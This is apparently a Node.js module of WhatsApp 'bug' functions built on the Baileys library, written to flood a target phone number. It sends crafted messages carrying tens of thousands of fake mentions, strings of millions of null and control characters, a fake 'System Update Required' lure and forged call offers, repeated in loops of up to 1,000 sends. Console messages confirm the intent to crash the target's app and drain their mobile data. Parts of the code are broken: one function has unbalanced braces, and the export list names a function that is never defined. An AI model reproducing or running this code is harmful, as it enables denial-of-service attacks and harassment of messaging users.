const { generateWAMessageFromContent, proto, jidDecode } = require('@whiskeysockets/baileys');
const chalk = require('chalk');
const crypto = require('crypto');
let encodeSignedDeviceIdentity;
try {
    const baileys = require('@whiskeysockets/baileys');
    encodeSignedDeviceIdentity = baileys.encodeSignedDeviceIdentity;
} catch (e) {
    encodeSignedDeviceIdentity = null;
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
async function DileyHard(bydaah, target, mention) {
  console.log(chalk.red(`Succes Sending Bug DelayXDrainKuota By XProtexGlow To ${target}`));
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
  for (let i = 0; i < 50; i++) {
      await bydaah.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id + i,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
      if (i % 50 === 0) await sleep(100); // Jeda kecil setiap 50 pesan agar tidak overload
  }
    
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".DRGN || VaxzyAnonymous" + "ោ៝".repeat(10000),
        title: "Jane doe",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/565435726_1705527740863951_637888654268576211_n.enc?ccb=11-4&oh=01_Q5Aa3gHD-tIvSSEbLhfV9R-6uBg7NQCAIUIWF_Ks1hOT9vCB5Q&oe=699994DB&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/ogg; codecs=opus",
            fileSha256: "09RcathuOi9NhSI0Mh1FzsDv0x4xeIKu/Q2CLUnE6Iw=",
            fileLength: "161950",
            seconds: 23,
            ptt: true,
            mediaKey: "nswZvPESBAPj/p9i9SJb72TrRbMXZpwKAXgNzg+Z/bg=",
            caption: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬",
            fileEncSha256: "RCTRmbAYRpxxQRPeS+4iefslNpL9vRo2btzmb4Cx6bU="
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    for (const msg of [msg1, msg2, msg3]) {       
        for (let i = 0; i < 90; i++) {
            await bydaah.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id + i,
                statusJidList: [target],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }]
                }]
            });
            if (i % 100 === 0) await sleep(50);
        }
    }

    if (mention) {
        await bydaah.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
 }

async function soul1(bydaah, target) {
    try {
        const interactivePayload = {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    jpegThumbnail: null
                },
                contextInfo: {
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    conversionSource: "porn",
                    conversionData: crypto.randomBytes(16),
                    conversionDelaySeconds: 9999,
                    forwardingScore: 999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "StX-Revolution 👾",
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "SOLO EXPOSED"
                    },
                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    },
                    expiration: -99999,
                    ephemeralSettingTimestamp: Date.now(),
                    ephemeralSharedSecret: crypto.randomBytes(16),
                    entryPointConversionSource: "WhatsaApp",
                    entryPointConversionApp: "WhatsApp",
                    actionLink: {
                        url: "t.me/PipopOfficial",
                        buttonTitle: "action_button"
                    },
                    disappearingMode: {
                        initiator: 1,
                        trigger: 2,
                        initiatorDeviceJid: target,
                        initiatedByMe: true
                    },
                    groupSubject: "Jeneng Ku Pipop",
                    parentGroupJid: "120363370626418572@g.us",
                    trustBannerType: "X",
                    trustBannerAction: 99999,
                    isSampled: true,
                    externalAdReply: {
                        title: "Jeneng Ku Pipop",
                        mediaType: 2,
                        renderLargerThumbnail: false,
                        showAdAttribution: false,
                        containsAutoReply: false,
                        body: "© S-3Xecution",
                        thumbnail: null,
                        sourceUrl: "t.me/PipopOfficial",
                        sourceId: "9T7A4M1A",
                        ctwaClid: "ctwaClid",
                        ref: "ref",
                        clickToWhatsappCall: true,
                        ctaPayload: "ctaPayload",
                        disableNudge: true,
                        originalImageUrl: null
                    },
                    featureEligibilities: {
                        cannotBeReactedTo: true,
                        cannotBeRanked: true,
                        canRequestFeedback: true
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363321780343299@newsletter",
                        serverMessageId: 1,
                        newsletterName: `Jeneng Ku Pipop ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                        contentType: 3,
                        accessibilityText: "Jeneng Ku Pipop"
                    },
                    statusAttributionType: 2,
                    utm: {
                        utmSource: "Jeneng Ku Pipop",
                        utmCampaign: "Jeneng Ku Pipop"
                    }
                },
                body: {
                    text: "Jeneng Ku Pipop"
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "payment_method",
                        buttonParamsJson: `{}`
                    }]
                }
            }
        };

        const msg1 = generateWAMessageFromContent(target, interactivePayload, {});
        await bydaah.relayMessage(target, msg1.message, { messageId: msg1.key.id });

        const paymentPayload = {
            requestPaymentMessage: {
                currencyCodeIso4217: 'USD',
                requestFrom: target,
                expiryTimestamp: null,
                contextInfo: {
                    remoteJid: " S ",
                    isForwarded: true,
                    forwardingScore: 979,
                    externalAdReply: {
                        title: "Jeneng Ku Pipop",
                        body: "Jeneng Ku Pipop",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewType: "VIDEO",
                        sourceUrl: "https://t.me/PipopOfficial",
                        mediaUrl: "https://t.me/PipopOfficial",
                        showAdAttribution: true,
                    }
                }
            }
        };

        await bydaah.relayMessage(target, paymentPayload, {
            participant: { jid: target },
            quoted: null,
            userJid: null,
            messageId: null
        });

        console.log(`Berhasil mengirim bug soul1 ke ${target}`);
        
    } catch (err) {
        console.error("Gagal mengirim pesan soul1:", err);
    }
}

async function soul2(bydaah, target) {
  try {
    const jid = String(target).includes("@s.whatsapp.net")
      ? String(target)
      : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

    const mapper = () => {
      let map = {};
      return {
        tx(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async (prev) => {
            try {
              await prev;
            } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    const lolcat = mapper();

    const baffer = (buf) =>
      Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);

    const enc = encodeSignedDeviceIdentity;

    bydaah.createParticipantNodes = async (
      recipientJids,
      message,
      extraAttrs,
      dsmMessage
    ) => {
      if (!recipientJids.length) {
        return { nodes: [], shouldIncludeDeviceIdentity: false };
      }

      const patched =
        (await bydaah.patchMessageBeforeSending?.(
          message,
          recipientJids
        )) ?? message;

      const stain = Array.isArray(patched)
        ? patched
        : recipientJids.map((recipie) => ({
            recipientJid: recipie,
            message: patched
          }));

      const { id: meId, lid: meLid } = bydaah.authState.creds.me;
      const attx = meLid ? jidDecode(meLid)?.user : null;

      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        stain.map(async ({ recipientJid: recipie, message: msg }) => {
          const { user: targetUser } = jidDecode(recipie);
          const { user: ownUser } = jidDecode(meId);

          const isOwn =
            targetUser === ownUser || targetUser === attx;

          const pient = recipie === meId || recipie === meLid;
          if (dsmMessage && isOwn && !pient) msg = dsmMessage;

          const bite = baffer(
            enc ? enc(msg) : Buffer.from([])
          );

          return lolcat.tx(recipie, async () => {
            const { type, ciphertext } =
              await bydaah.signalRepository.encryptMessage({
                jid: recipie,
                data: bite
              });

            if (type === "pkmsg") {
              shouldIncludeDeviceIdentity = true;
            }

            return {
              tag: "to",
              attrs: { jid: recipie },
              content: [
                {
                  tag: "enc",
                  attrs: { v: "2", type, ...extraAttrs },
                  content: ciphertext
                }
              ]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    let devices = [];

    try {
      devices = (
        await bydaah.getUSyncDevices([jid], false, false)
      ).map(({ user, device }) =>
        `${user}${device ? ":" + device : ""}@s.whatsapp.net`
      );
    } catch {
      devices = [jid];
    }

    try {
      await bydaah.assertSessions(devices);
    } catch {}

    let vict = [];
    let shouldIncludeDeviceIdentity = false;

    try {
      const created = await bydaah.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: "0" }
      );

      vict = created?.nodes ?? [];
      shouldIncludeDeviceIdentity =
        !!created?.shouldIncludeDeviceIdentity;
    } catch {}

    const main = {
      tag: "call",
      attrs: {
        to: jid,
        id:
          bydaah.generateMessageTag?.() ??
          crypto.randomBytes(8).toString("hex"),
        from:
          bydaah.user?.id ||
          bydaah.authState?.creds?.me?.id
      },
      content: [
        {
          tag: "offer",
          attrs: {
            "call-id": crypto
              .randomBytes(16)
              .toString("hex")
              .slice(0, 64)
              .toUpperCase(),
            "call-creator":
              bydaah.user?.id ||
              bydaah.authState?.creds?.me?.id
          },
          content: [
            { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
            { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
            {
              tag: "video",
              attrs: {
                orientation: "0",
                screen_width: "1920",
                screen_height: "1080",
                device_orientation: "0",
                enc: "vp8",
                dec: "vp8"
              }
            },
            { tag: "net", attrs: { medium: "3" } },
            {
              tag: "capability",
              attrs: { ver: "1" },
              content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
            },
            { tag: "encopt", attrs: { keygen: "2" } },
            {
              tag: "destination",
              attrs: {},
              content: vict
            }
          ]
        }
      ]
    };

    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
      try {
        const deviceIdentity = encodeSignedDeviceIdentity(
          bydaah.authState.creds.account,
          true
        );

        main.content[0].content.push({
          tag: "device-identity",
          attrs: {},
          content: deviceIdentity
        });
      } catch {}
    }

    await bydaah.relayMessage(
      target,
      {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          requestFrom: target,
          expiryTimestamp: null,
          contextInfo: {
            remoteJid: " S ",
            isForwarded: true,
            forwardingScore: 9999,
            externalAdReply: {
              title: " S ",
              body: " S ",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewTtpe: "VIDEO",
              sourceUrl: "https://t.me/PipopOfficial",
              mediaUrl: "https://t.me/PipopOfficial",
              showAdAttribution: true
            }
          }
        }
      },
      {
        participant: { jid: target },
        quoted: null,
        userJid: null,
        messageId: null
      }
    );

    await bydaah.sendNode(main);
    console.log(`Berhasil mengirim bug soul2 ke ${target}`);
  } catch (e) {
      console.error("Error in soul2:", e);
  }
}

async function soulz(bydaah, target) {
    await soul1(bydaah, target);
    await sleep(1000);
    await soul2(bydaah, target);
}

async function SeG(bydaah, target, mention) {
	for (let i = 0; i < 969; i++) {
    try {
        const flowCrashPayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "System Update Required",
                            hasMediaAttachment: false
                        },
                        body: {
                            text: "Your WhatsApp version is outdated. Please update to continue using the service."
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "flow",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "Update Now",
                                        id: "update_flow",
                                        flow_token: crypto.randomBytes(16).toString('hex'),
                                        flow_id: "666666666666666",
                                        flow_action: "navigate",
                                        flow_action_payload: {
                                            screen: "TERMINAL_SCREEN",
                                            data: {
                                                "crash_data": "{{{}}".repeat(50000) + " \u000".repeat(1000000) + "".repeat(50000)
                                            }
                                        }
                                    })
                                }
                            ]
                        },
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            isForwarded: true,
                            forwardingScore: 999
                        }
                    }
                }
            }
        };

        
        const carouselCrashPayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "\u0000",
                            hasMediaAttachment: false
                        },
                        carouselMessage: {
                            cards: Array.from({ length: 10 }, () => ({
                                header: {
                                    title: "\u0000",
                                    hasMediaAttachment: false
                                },
                                body: {
                                    text: "\u0000".repeat(50000)
                                },
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "payment_method",
                                            buttonParamsJson: "{\"id\":\"" + "/htpss://127.9293.233".repeat(100000) + "\"}"
                                        }
                                    ]
                                }
                            }))
                        },
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            isForwarded: true,
                            forwardingScore: 999
                        }
                    }
                }
            }
        };

        
        const sendInvisibleBug = async (payload) => {
            const msg = generateWAMessageFromContent(target, payload, {
                participant: { jid: target }
            });

            await bydaah.relayMessage(target, msg.message, { 
                messageId: msg.key.id,
                participant: { jid: "0@s.whatsapp.net" }
            });

            const deleteMsg = {
                protocolMessage: {
                    key: msg.key,
                    type: 0
                }
            };
            const msgDelete = generateWAMessageFromContent(target, deleteMsg, {});
            await bydaah.relayMessage(target, msgDelete.message, { 
                messageId: msgDelete.key.id,
                participant: { jid: "0@s.whatsapp.net" }
            });
        };

        await sendInvisibleBug(flowCrashPayload);
        await sleep(300);
        await sendInvisibleBug(carouselCrashPayload);
        const msgStatus = generateWAMessageFromContent(target, flowCrashPayload, {});
        for (let i = 0; i < 500; i++) {
            await bydaah.relayMessage("status@broadcast", msgStatus.message, {
                messageId: msgStatus.key.id + i,
                statusJidList: [target],
                participant: { jid: "0@s.whatsapp.net" },
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                            }
                        ]
                    }
                ]
            });
            if (i % 100 === 0) await sleep(50);
        }

        console.log(`Berhasil mengirim bug ke ${target}`);

    } catch (e) {
        console.error("Error in:", e.message);
    }
}

async function AboutYou(bydaah, target, ptcp = true) {
    for (let i = 0; i < 1000; i++) {
        try {
            const msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "./#",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\x10".repeat(1045000),
                                version: 3,
                            },
                            entryPointConversionSource: "galaxy_message",
                        }
                    }
                }
            }, {
                ephemeralExpiration: 0,
                forwardingScore: 9741,
                isForwarded: true,
                font: Math.floor(Math.random() * 99999999),
                background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
            });
            await bydaah.relayMessage(target, {
                groupStatusMessageV2: {
                    message: msg.message,
                },
            }, ptcp ? {
                messageId: msg.key.id,
                participant: { jid: target },
            } : { messageId: msg.key.id });
            const paymentMsg = {
                viewOnceMessage: {
                    message: {
                        requestPaymentMessage: {
                            body: {
                                text: "./$",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "review_and_pay",
                                paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                                version: 3
                            }
                        }
                    }
                }
            };
            await bydaah.relayMessage(target, paymentMsg, {
                groupId: null,
                participant: { jid: target }
            });
            const stickerMsg = {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "fxxvVtTCmZ2Bpm/GEYpFF2GKUzJ8wWVrGY1mCmmh4I4=",
                    fileEncSha256: "3xsWx0Y/1pNbWXWh/OG2mt4Ld0FEug25kyZ+lC+UbV4=",
                    mediaKey: "uHEU7OghGYVW7IcWjhNlxPeZHNS0qfphvRUcy6+22wo=",
                    mediaKeyTimestamp: "1763628089",
                    mimetype: "image/webp",
                    height: 64,
                    width: 64,
                    directPath: "/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0",
                    fileLength: "13862",
                    isAnimated: false
                }
            };
            await bydaah.relayMessage(target, stickerMsg);
            await sleep(1000);
        } catch (error) {}
    }
}

module.exports = {
    DileyHard,
    soulz,
    mbg1945,
    AboutYou,
    sleep
};
